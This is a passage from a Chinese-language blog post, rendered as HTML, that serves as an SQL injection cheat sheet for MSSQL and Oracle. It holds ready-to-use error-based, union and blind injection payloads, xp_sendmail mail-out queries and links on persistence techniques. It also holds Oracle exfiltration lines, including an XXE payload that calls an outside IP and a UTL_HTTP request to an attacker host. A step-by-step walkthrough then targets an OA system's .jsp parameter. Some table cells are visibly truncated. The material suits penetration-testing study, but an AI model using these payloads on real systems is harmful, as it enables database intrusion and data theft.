+<td align="left">EXEC xp_sendmail @ recipients =&#39;harold @ netspi.com&#39;，<br>@ message =&#39;这是一个测试。&#39;，<br>@ copy_recipients =&#39;test @ netspi.com&#39;，<br>@ subject =&#39;TEST&#39;</td>
+</tr>
+<tr>
+<td align="left">通过xp_sendmail发送查询结果</td>
+<td align="left">EXEC xp_sendmail &#39;harold@netspi.com&#39;, @query=&#39;SELECT @@version&#39;;</td>
+</tr>
+<tr>
+<td align="left">通过xp_sendmail将查询结果作为附件发送</td>
+<td align="left">CREATE TABLE ##texttab (c1 text)<br>INSERT ##texttab values (&#39;Put messge here.&#39;)<br>DECLARE @cmd varchar(56)<br>SET @cmd = &#39;SELECT c1 from ##texttab&#39;<br>EXEC master.dbo.xp_sendmail &#39;robertk&#39;,<br>@query = @cmd, @no_header=&#39;TRUE&#39;<br>DROP TABLE ##texttab</td>
+</tr>
+</tbody></table>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Startup stored procedures</td>
+<td align="left"><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td>
+</tr>
+<tr>
+<td align="left">Triggers</td>
+<td align="left"><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td>
+</tr>
+<tr>
+<td align="left">Regwrite</td>
+<td align="left"><a href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a></td>
+</tr>
+</tbody></table>
+<h2 id="注入类型-1"><a href="#注入类型-1" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="Error-Based-1"><a href="#Error-Based-1" class="headerlink" title="Error Based"></a>Error Based</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">显式转换</td>
+<td align="left"><code>SELECT convert(int,(SELECT @@version)) SELECT cast((SELECT @@version) as int)</code></td>
+</tr>
+<tr>
+<td align="left">隐式转换</td>
+<td align="left"><code>SELECT 1/@@version</code></td>
+</tr>
+</tbody></table>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-10-16_19-51-01.png" alt></p>
+<p>MSSQL CAST函数示例</p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">将CAST函数插入当前查询</td>
+<td align="left">SELECT CAST(@@version as int)</td>
+</tr>
+<tr>
+<td align="left">显示系统用户</td>
+<td align="left">SELECT CAST(SYSTEM_USER as int);</td>
+</tr>
+<tr>
+<td align="left">用xml路径在一行中显示所有数据库</td>
+<td align="left">SELECT CAST((SELECT name,&#39;,&#39; FROM master..sysdatabases FOR XML path(&#39;&#39;)) as int) <br>SELECT CAST((SELECT name AS &quot;data()&quot; FROM master..sysdatabases FOR xml path(&#39;&#39;)) AS int);</td>
+</tr>
+<tr>
+<td align="left">显示服务器名称</td>
+<td align="left">SELECT CAST(@@SERVERNAME as int);</td>
+</tr>
+<tr>
+<td align="left">显示服务名称</td>
+<td align="left">SELECT CAST(@@SERVICENAME as int);</td>
+</tr>
+<tr>
+<td align="left">显示数据库列表<br><em>注意：下面的查询必须在一行中执行。</em></td>
+<td align="left">DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;<br>SELECT @listStr = @listStr + Name + &#39;,&#39; FROM master..sysdatabases;<br>SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</td>
+</tr>
+<tr>
+<td align="left">显示表列表<br><em>注意：以下查询必须在一行中执行。</em></td>
+<td align="left">DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);<br>SET @listStr = &#39;&#39;;SELECT @listStr = @listStr + Name + &#39;,&#39; FROM MYDATABASE..sysobjects WHERE type = &#39;U&#39;;<br>SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</td>
+</tr>
+<tr>
+<td align="left">显示列列表<br><em>注意：下面的查询必须在一行中执行。</em></td>
+<td align="left">DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = &#39;&#39;;<br>SELECT @listStr = @listStr + Name + &#39;,&#39; FROM MYDATABASE..syscolumns WHERE id=object_id(&#39;MYTABLE&#39;);<br>SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);</td>
+</tr>
+<tr>
+<td align="left">显示列数据<br><em>注意：下面的查询必须在一行中执行。用*替换MYCOLUMN以选择所有列</em></td>
+<td align="left">DECLARE @listStr VARCHAR(MAX);<br>DECLARE @myoutput VARCHAR(MAX);<br>SET @listStr = &#39;&#39;;<br>SELECT @listStr = @listStr + MYCOLUMN + &#39;,&#39; FROM MYDATABASE..MYTABLE;<br>SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1)<br>SELECT CAST(@myoutput as int);</td>
+</tr>
+<tr>
+<td align="left">一次显示一个数据库名称</td>
+<td align="left">SELECT TOP 1 CAST(name as int)<br>FROM sysdatabases<br>WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC)<br>ORDER BY name DESC</td>
+</tr>
+</tbody></table>
+<h3 id="Union-Based-Injection-1"><a href="#Union-Based-Injection-1" class="headerlink" title="Union-Based Injection"></a>Union-Based Injection</h3><p>基于联合的SQL注入使攻击者可以通过扩展原始查询返回的结果来从数据库中提取信息。仅当原始查询/新查询具有相同的结构（列的数量和数据类型）时，才可以使用Union运算符。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">联合查询</td>
+<td align="left">SELECT user UNION SELECT @@version</td>
+</tr>
+<tr>
+<td align="left">联合子查询</td>
+<td align="left">SELECT user UNION (SELECT @@version)</td>
+</tr>
+<tr>
+<td align="left">Union null <br><em>如果原始查询返回的列不止一列，请添加null以等于列数</em></td>
+<td align="left">SELECT user,system_user UNION (SELECT @@version,null)</td>
+</tr>
+<tr>
+<td align="left">Union null binary halving <br><em>此查询用于检测列数。列过多会返回错误，请查找与错误相距1的[numberOfColumns]</em></td>
+<td align="left">SELECT * FROM yourtable ORDER BY [numberOfColumns]</td>
+</tr>
+<tr>
+<td align="left">堆叠查询 <br>堆叠查询并不总是返回结果，因此，它们最适合用于更新/修改数据的注入。</td>
+<td align="left">SELECT @@version; SELECT @@version --</td>
+</tr>
+</tbody></table>
+<h3 id="Blind-Injection-1"><a href="#Blind-Injection-1" class="headerlink" title="Blind Injection"></a>Blind Injection</h3><p>可以通过HTTP响应中不同的HTTP状态代码，响应时间，内容长度和HTML内容来确定部分盲注入。这些标记可以指示正确或错误的陈述。下面的查询将通过对猜测的信息断言是对还是错来尝试利用注入。还可以通过返回1（True）或0（False）行来标识对还是错查询。错误也可以用于标识0（False）。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">版本是12.0.2000.8</td>
+<td align="left"><code>SELECT @@version WHERE @@version LIKE &#39;%12.0.2000.8%&#39;</code></td>
+</tr>
+<tr>
+<td align="left">启用子选择</td>
+<td align="left"><code>SELECT (SELECT @@version)</code></td>
+</tr>
+<tr>
+<td align="left">表log_table存在</td>
+<td align="left"><code>SELECT * FROM log_table</code></td>
+</tr>
+<tr>
+<td align="left">表log_table中存在列消息</td>
+<td align="left"><code>SELECT message from log_table</code></td>
+</tr>
+<tr>
+<td align="left">第一封邮件的首字母为t</td>
+<td align="left"><code>WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like &#39;t%&#39;</code></td>
+</tr>
+</tbody></table>
+<p><strong>将部分盲查询转换为全盲查询</strong></p>
+<p>全盲查询不会在HTTP / HTML响应中指示查询的任何结果。这使得它们依赖于定时功能和其他<a href="https://sqlwiki.netspi.com/attackQueries/dataExfiltration" target="_blank" rel="noopener">带外</a>攻击<a href="https://sqlwiki.netspi.com/attackQueries/dataExfiltration" target="_blank" rel="noopener">方法</a>。正确的语句将花费X秒来响应，错误的语句应立即返回。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Version is 12.0.2000.8</td>
+<td align="left"><code>IF exists(SELECT @@version where @@version like &#39;%12.0.2000.8%&#39;) WAITFOR DELAY &#39;00:00:02&#39;</code></td>
+</tr>
+</tbody></table>
+<h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><p>docker oracle安装教程</p>
+<p><a href="http://www.thxopen.com/linux/docker/2019/04/17/install-oracle11g-on-docker.html" target="_blank" rel="noopener">http://www.thxopen.com/linux/docker/2019/04/17/install-oracle11g-on-docker.html</a></p>
+<p>进入docker</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull jaspeen/oracle-11g</span><br><span class="line">docker run --privileged --name oracle11g -p 1521:1521 -v /home/tcc/docker/oracle/oracleinstall:/install jaspeen/oracle-11g</span><br><span class="line">docker exec -it oracle11g /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>修改密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter user sys identified by &quot;sys&quot;</span><br><span class="line">alter user system identified by &quot;system&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>报错：ORA-28009 connection as SYS should be as SYSDBA or SYSOPER</p>
+<p>将“连接为”选项框的Normal改为SYSDBA或SYSOPER，即可登录成功。</p>
+</blockquote>
+<p>orale利用视图关系：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DBA_TABLES、ALL_TABLES以及USER_TABLES此三个视图可以用来查询ORACLE中关系表信息，它们之间的关系和区别有:</span><br><span class="line"></span><br><span class="line">DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</span><br><span class="line"></span><br><span class="line">DBA_TABLES意为DBA拥有的或可以访问的所有的关系表。</span><br><span class="line"></span><br><span class="line">ALL_TABLES意为某一用户拥有的或可以访问的所有的关系表。</span><br><span class="line"></span><br><span class="line">USER_TABLES意为某一用户所拥有的所有的关系表。</span><br><span class="line">(所以一下内容请不要纠结于all_tables与user_tables关系，本例中为普通用户)</span><br><span class="line"></span><br><span class="line">user_tab_columns是保存了当前用户的表、视图和Clusters中的列等信息，用于oracle获取表结构.使用时尽量使用USER_TAB_COLUMNS</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击队列-2"><a href="#攻击队列-2" class="headerlink" title="攻击队列"></a>攻击队列</h2><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><p>数据库语句</p>
+<table>
+<thead>
+<tr>
+<th align="left">Oracle</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">SELECT user FROM dual;</td>
+<td align="left">当前用户</td>
+</tr>
+<tr>
+<td align="left">SELECT username FROM all_users ORDER BY username;</td>
+<td align="left">所有用户</td>
+</tr>
+<tr>
+<td align="left">SELECT DISTINCT owner FROM all_tables;</td>
+<td align="left">列出数据库</td>
+</tr>
+<tr>
+<td align="left">SELECT table_name FROM all_tables; SELECT owner, table_name FROM all_tables;</td>
+<td align="left">列出表名</td>
+</tr>
+<tr>
+<td align="left">SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;</td>
+<td align="left">列出字段名</td>
+</tr>
+<tr>
+<td align="left">SELECT name FROM V$DATAFILE;</td>
+<td align="left">数据库文件</td>
+</tr>
+<tr>
+<td align="left">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = &#39;YES&#39;;</td>
+<td align="left">数据库账户</td>
+</tr>
+<tr>
+<td align="left">SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; (Gets IP Address)<br>SELECT UTL_INADDR.get_host_name(&#39;10.0.0.1&#39;) FROM dual; (Gets Hostnames)</td>
+<td align="left">Hostname, IP Address</td>
+</tr>
+<tr>
+<td align="left">SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;<br>SELECT banner FROM v$version WHERE banner LIKE &#39;TNS%&#39;;<br>SELECT version FROM v$instance;</td>
+<td align="left">列出版本</td>
+</tr>
+</tbody></table>
+<h3 id="Data-Exfiltration-1"><a href="#Data-Exfiltration-1" class="headerlink" title="Data Exfiltration"></a>Data Exfiltration</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Combine multiple lines into one</td>
+<td align="left"><code>SELECT dbms_xmlgen.getxmltype(&#39;select user from dual&#39;) FROM dual</code></td>
+</tr>
+<tr>
+<td align="left">XML External Entity</td>
+<td align="left"><code>SELECT xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://118.25.69.199/xss&quot;&gt; %remote; %param1;]&gt;&#39;) FROM dual;</code></td>
+</tr>
+<tr>
+<td align="left">URL_HTTP Request (Pre-11gR2)</td>
+<td align="left"><code>SELECT UTL_HTTP.request (&#39;http://IP/test&#39;) FROM dual;</code></td>
+</tr>
+<tr>
+<td align="left">Escaping special characters</td>
+<td align="left">`SELECT UTL_URL.escape(&#39;<a href="http://IP/&#39;" target="_blank" rel="noopener">http://IP/&#39;</a></td>
+</tr>
+</tbody></table>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-10-18_15-33-18.png" alt></p>
+<p><strong>Oracle 带外通信（检测流量）</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-10-18_15-36-28.png" alt></p>
+<h2 id="注入类型-2"><a href="#注入类型-2" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="Error-Based-2"><a href="#Error-Based-2" class="headerlink" title="Error Based"></a>Error Based</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Invalid HTTP Request</td>
+<td align="left"><code>SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual</code></td>
+</tr>
+<tr>
+<td align="left">CTXSYS.DRITHSX.SN</td>
+<td align="left"><code>SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual</code></td>
+</tr>
+<tr>
+<td align="left">Invalid XPath</td>
+<td align="left"><code>SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual</code></td>
+</tr>
+<tr>
+<td align="left">Invalid XML</td>
+<td align="left">`SELECT to_char(dbms_xmlgen.getxml(&#39;select &quot;&#39;</td>
+</tr>
+<tr>
+<td align="left">Invalid XML</td>
+<td align="left">`SELECT rtrim(extract(xmlagg(xmlelement(&quot;s&quot;, username</td>
+</tr>
+</tbody></table>
+<p>1.使用utl_inaddr.get_host_name()进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and 1=utl_inaddr.get_host_name((select username from user_users));</span><br><span class="line"> </span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and 1=utl_inaddr.get_host_name((select banner from sys.v_$version where rownum=1));</span><br></pre></td></tr></table></figure>
+
+<p>2.使用ctxsys.drithsx.sn()进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and 1=ctxsys.drithsx.sn(1,(select username from user_users));</span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1));</span><br></pre></td></tr></table></figure>
+
+<p>3.使用XMLType()进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (select upper(XMLType(chr(60)||chr(58)||(select username from user_users)||chr(62))) from dual) is not null;</span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (select upper(XMLType(chr(60)||chr(58)||(select banner from sys.v_$version where rownum=1)||chr(62))) from dual) is not null;</span><br></pre></td></tr></table></figure>
+
+<p>4.使用dbms_xdb_version.checkin()进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null;</span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (select dbms_xdb_version.checkin((select username from user_users)) from dual) is not null;</span><br></pre></td></tr></table></figure>
+
+<p>5.使用dbms_xdb_version.makeversioned()进报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (select dbms_xdb_version.makeversioned((select username from user_users)) from dual) is not null;</span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (select dbms_xdb_version.makeversioned((select banner from sys.v_$version where rownum=1)) from dual) is not null;</span><br></pre></td></tr></table></figure>
+
+<p>6.使用dbms_xdb_version.uncheckout()进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (select dbms_xdb_version.uncheckout((select username from user_users)) from dual) is not null;</span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null;</span><br></pre></td></tr></table></figure>
+
+<p>7.使用dbms_utility.sqlid_to_sqlhash()进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select username from user_users)) from dual) is not null;</span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null;</span><br></pre></td></tr></table></figure>
+
+<p>8.使用ordsys.ord_dicom.getmappingxpath()进行报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user);</span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user);</span><br></pre></td></tr></table></figure>
+
+<p>9.使用decode进行报错注入，这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法（类似于盲注的每个字符二分查找来猜解）。</p>
+<ul>
+<li><p>Oracle中的substr函数和MySQL有点区别，例如substr(&quot;archerx&quot;,0,1)  substr(&quot;archerx&quot;,1,1)都是截取第一个字符。</p>
+</li>
+<li><p>decode(a,b,c,d)函数 :  if a==b return c else d</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select substr(user,1,1) from dual;</span><br><span class="line"> </span><br><span class="line">SUBS</span><br><span class="line">----</span><br><span class="line">S</span><br><span class="line"> </span><br><span class="line">SQL&gt; select (decode(substr(user,1,1),&quot;S&quot;,1,2) from dual;</span><br><span class="line">select (decode(substr(user,1,1),&quot;S&quot;,1,2) from dual</span><br><span class="line">                                         *</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-00907: missing right parenthesis</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and 0=(select decode(substr(user,1,1),&apos;S&apos;,(1/0),0) from dual);  # 正确 返回（1/0）报错</span><br><span class="line">select banner from sys.v_$version where rownum=1 and 0=(select decode(substr(user,1,1),&apos;S&apos;,(1/0),0) from dual)</span><br><span class="line">                                                                                             *</span><br><span class="line">ERROR at line 1:</span><br><span class="line">ORA-01476: divisor is equal to zero</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">SQL&gt; select banner from sys.v_$version where rownum=1 and 0=(select decode(substr(user,1,1),&apos;Y&apos;,(1/0),0) from dual);  # 错误  返回  0 ， 0==0 返回正常select查询结果</span><br><span class="line"> </span><br><span class="line">BANNER</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</span><br></pre></td></tr></table></figure>
+
+<h3 id="Union-Based-Injection-2"><a href="#Union-Based-Injection-2" class="headerlink" title="Union-Based Injection"></a>Union-Based Injection</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Union</td>
+<td align="left"><code>SELECT user FROM dual UNION SELECT * FROM v$version</code></td>
+</tr>
+<tr>
+<td align="left">Union subquery</td>
+<td align="left"><code>SELECT user FROM dual UNION (SELECT * FROM v$version)</code></td>
+</tr>
+<tr>
+<td align="left">Union null</td>
+<td align="left"><code>SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version)</code></td>
+</tr>
+</tbody></table>
+<h3 id="Blind-Injection-2"><a href="#Blind-Injection-2" class="headerlink" title="Blind Injection"></a>Blind Injection</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Version is 12.2</td>
+<td align="left"><code>SELECT COUNT(*) FROM v$version WHERE banner LIKE &#39;Oracle%12.2%&#39;;</code></td>
+</tr>
+<tr>
+<td align="left">Subselect is enabled</td>
+<td align="left"><code>SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)</code></td>
+</tr>
+<tr>
+<td align="left">Table log_table exists</td>
+<td align="left"><code>SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);</code></td>
+</tr>
+<tr>
+<td align="left">Column message exists in table log_table</td>
+<td align="left"><code>Select COUNT(*) from user_tab_cols where column_name = &#39;MESSAGE&#39; and table_name = &#39;LOG_TABLE&#39;;</code></td>
+</tr>
+<tr>
+<td align="left">First letter of first message is t</td>
+<td align="left"><code>Select message from log_table where rownum=1 and message LIKE &#39;t%&#39;;</code></td>
+</tr>
+</tbody></table>
+<h2 id="Oracle-注入一般步骤："><a href="#Oracle-注入一般步骤：" class="headerlink" title="Oracle 注入一般步骤："></a>Oracle 注入一般步骤：</h2><p>刚好看到一篇<a href="http://host906022921.s246.pppf.com.cn/index.php/archives/117/" target="_blank" rel="noopener">基于泛微OA注入学习及成果输出</a>，摘抄过来。</p>
+<h3 id="显性注入：简单快捷的用法"><a href="#显性注入：简单快捷的用法" class="headerlink" title="显性注入：简单快捷的用法"></a>显性注入：简单快捷的用法</h3><p><strong>函数：utl_inaddr.get_host_address</strong></p>
+<p><strong>用法：utl_inaddr.get_host_address（sql Injection）</strong></p>
+<p>utl_inaddr.get_host_address 本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。我们传递的是一个sql 语句所以返回的就是语句执行的结果。</p>
+<ul>
+<li>利用这一点就不用去找字段了。。。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.jsp?cdd=1 or 1=utl_inaddr.get_host_address (SQL Injection)</span><br><span class="line"></span><br><span class="line">.jsp?cdd=1 or 1=utl_inaddr.get_host_address ((select member from v$logfile where rownum=1)) --</span><br></pre></td></tr></table></figure>
+
+<h3 id="显性注入：通用"><a href="#显性注入：通用" class="headerlink" title="显性注入：通用"></a>显性注入：通用</h3><h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>利用<code>and 1=1</code>, <code>and 1=2</code>, <code>&#39;</code>, <code>&quot;</code>等字符结合起来进行注入点确定。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count (*) from user_tables)&gt;0--</span><br><span class="line">and (select count (*) from dual)&gt;0--</span><br></pre></td></tr></table></figure>
+
+<h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><ul>
+<li>通常利用<code>order by</code>进行字段数确认。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by N -- (?jsp=2 order by 3--)</span><br></pre></td></tr></table></figure>
+
+<p><code>union select null,banner from v$version order by (((1</code> (实例，判断版本)</p>
+<h4 id="填充字段"><a href="#填充字段" class="headerlink" title="填充字段"></a>填充字段</h4><p>确定每个字段类型。</p>
+<ul>
+<li><p>dual表和user_tables表是oracle中的系统表。</p>
+</li>
+<li><p>确定字段类型使用union语句，union操作符用于合并两个或者多个select语句的字符集</p>
+<p>（1）union内部的select语句必须拥有相同的列</p>
+</li>
+</ul>
+<p>（2）列也必须拥有相同的数据类型</p>
+<p>（3）每条select语句中的列顺序必须相同</p>
+<p>null默认匹配所有字段，&#39;null&#39;匹配字符类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select null,null from dual order by 2--</span><br><span class="line">Union select &apos;null&apos;,null from dual order by 2--</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>利用<code>and 1=2</code>使一句正常查询无返回结果,此时字段会对应显示在替换元查询结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select null,&apos;null&apos; from dual order by (((1</span><br></pre></td></tr></table></figure>
+
+<p>上述语句查询结果为：<code>[{&quot;id&quot;:&quot;wf_&quot;,&quot;text&quot;:&quot;null&quot;,&quot;leaf&quot;:true,&quot;checked&quot;:false,&quot;draggable&quot;:false}]</code></p>
+<p>因此可以确定，第二个字段为&#39;text&#39;内容，可以利用其进行注入。</p>
+<h5 id="获取系统信息"><a href="#获取系统信息" class="headerlink" title="获取系统信息"></a>获取系统信息</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">当前数据库版本 （ select banner from sys.v_$version where rownum=1）</span><br><span class="line">and 1=2 union select null,banner from sys.v_$version where rownum=1 order by (((1</span><br><span class="line"></span><br><span class="line">服务器监听IP （select utl_inaddr.get_host_address from dual）</span><br><span class="line">and 1=2 union select null,utl_inaddr.get_host_address from dual order by (((1</span><br><span class="line"></span><br><span class="line">服务器操作系统(路径) （select member from v$logfile where rownum=1）</span><br><span class="line">and 1=2 union select 